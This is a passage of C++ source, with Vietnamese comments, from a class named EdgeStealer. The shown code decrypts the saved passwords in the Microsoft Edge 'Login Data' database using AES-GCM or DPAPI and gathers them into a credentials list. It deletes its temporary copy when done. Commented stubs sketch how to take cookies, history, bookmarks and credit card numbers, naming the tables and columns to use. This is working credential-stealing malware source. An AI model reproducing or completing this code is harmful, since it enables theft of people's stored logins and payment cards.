                // password_value là một BLOB (Binary Large Object).
                const BYTE* passwordBlob = reinterpret_cast<const BYTE*>(sqlite3_column_blob(stmt, 2)); // Cột 2
                int passwordBlobSize = sqlite3_column_bytes(stmt, 2); // Kích thước của BLOB.

                if (!passwordBlob || passwordBlobSize == 0) continue; // Bỏ qua nếu mật khẩu rỗng.

                vector<BYTE> encryptedPassword(passwordBlob, passwordBlob + passwordBlobSize);
                string decryptedPasswordStr;

                // Bước 9: Kiểm tra định dạng mã hóa và giải mã mật khẩu.
                // Nếu 3 byte đầu là "v10" hoặc "v11", đó là AES-GCM.
                if (passwordBlobSize > 3 && passwordBlob[0] == 'v' && passwordBlob[1] == '1' && (passwordBlob[2] == '0' || passwordBlob[2] == '1')) {
                    // Cấu trúc: "v1x" (3 bytes) + IV (12 bytes) + Ciphertext (N bytes) + Tag (16 bytes)
                    const int prefixLen = 3;
                    const int ivLen = 12;
                    const int tagLen = 16;

                    if (passwordBlobSize < (prefixLen + ivLen + tagLen)) { // Kiểm tra độ dài tối thiểu
                        continue; // Dữ liệu không đủ dài cho cấu trúc AES-GCM.
                    }

                    // Trích xuất IV, Ciphertext, và Tag.
                    vector<BYTE> iv(encryptedPassword.begin() + prefixLen, encryptedPassword.begin() + prefixLen + ivLen);
                    vector<BYTE> ciphertext(encryptedPassword.begin() + prefixLen + ivLen, encryptedPassword.end() - tagLen);
                    vector<BYTE> tag(encryptedPassword.end() - tagLen, encryptedPassword.end());

                    // Giải mã bằng AES-GCM.
                    vector<BYTE> decryptedPasswordBytes = AESGCMDecrypt(aesKey, iv, tag, ciphertext);
                    if (!decryptedPasswordBytes.empty()) {
                        decryptedPasswordStr.assign(reinterpret_cast<char*>(decryptedPasswordBytes.data()), decryptedPasswordBytes.size());
                    }
                }
                else {
                    // Không có tiền tố "v1x", giả định là DPAPI kiểu cũ.
                    vector<BYTE> decryptedPasswordBytes = DPAPIUnprotectData(encryptedPassword);
                    if (!decryptedPasswordBytes.empty()) {
                        decryptedPasswordStr.assign(reinterpret_cast<char*>(decryptedPasswordBytes.data()), decryptedPasswordBytes.size());
                    }
                }

                // Nếu giải mã thành công, thêm vào danh sách credentials.
                if (!decryptedPasswordStr.empty()) {
                    credentials.emplace_back(profileNameA, originUrl, username, decryptedPasswordStr);
                }
            }
        }

        // Bước 10: Dọn dẹp tài nguyên SQLite và xóa file tạm.
        sqlite3_finalize(stmt); // Hủy đối tượng statement.
        sqlite3_close(db);      // Đóng kết nối database.
        DeleteFileW(tempLoginDataPathW.c_str()); // Xóa file "LoginDataTemp.db".
    }

    return credentials; // Trả về danh sách thông tin đăng nhập đã lấy được.
}

// --- Các phương thức khác (chưa được triển khai đầy đủ trong code gốc) ---
// Chúng sẽ trả về vector rỗng hoặc cần logic tương tự (ví dụ: Cookies, CreditCards cần giải mã).

// vector<tuple<string, string, string>> EdgeStealer::StealCookies() {
//     // TODO: Logic để lấy cookies.
//     // - Tương tự StealPasswords: lấy AES key.
//     // - File database là "Cookies" (cũng là SQLite).
//     // - Bảng "cookies", cột "encrypted_value".
//     // - Giải mã "encrypted_value" bằng AES-GCM (nếu có "v10") hoặc DPAPI.
//     // - Cần các cột: host_key, name, path, encrypted_value (để giải mã thành value), expires_utc.
//     return vector<tuple<string, string, string>>();
// }

// vector<tuple<string, string, long long>> EdgeStealer::StealHistory() {
//     // TODO: Logic để lấy lịch sử duyệt web.
//     // - File database là "History" (SQLite).
//     // - Bảng "urls", các cột như url, title, visit_count, last_visit_time.
//     // - Không yêu cầu giải mã phức tạp.
//     return vector<tuple<string, string, long long>>();
// }

// vector<tuple<string, string>> EdgeStealer::StealBookmarks() {
//     // TODO: Logic để lấy bookmarks.
//     // - File là "Bookmarks" (không có phần mở rộng, định dạng JSON).
//     // - Cần parse JSON để lấy thông tin url và name của bookmarks.
//     // - Không yêu cầu giải mã.
//     return vector<tuple<string, string>>();
// }

// vector<tuple<string, string, string>> EdgeStealer::StealCreditCards() {
//     // TODO: Logic để lấy thông tin thẻ tín dụng.
//     // - File database là "Web Data" (SQLite).
//     // - Bảng "credit_cards", cột "card_number_encrypted".
//     // - Giải mã "card_number_encrypted" bằng AES-GCM (sử dụng cùng AES key từ Local State) hoặc DPAPI.
//     // - Cần các cột: name_on_card, expiration_month, expiration_year, card_number_encrypted.
//     return vector<tuple<string, string, string>>();
// }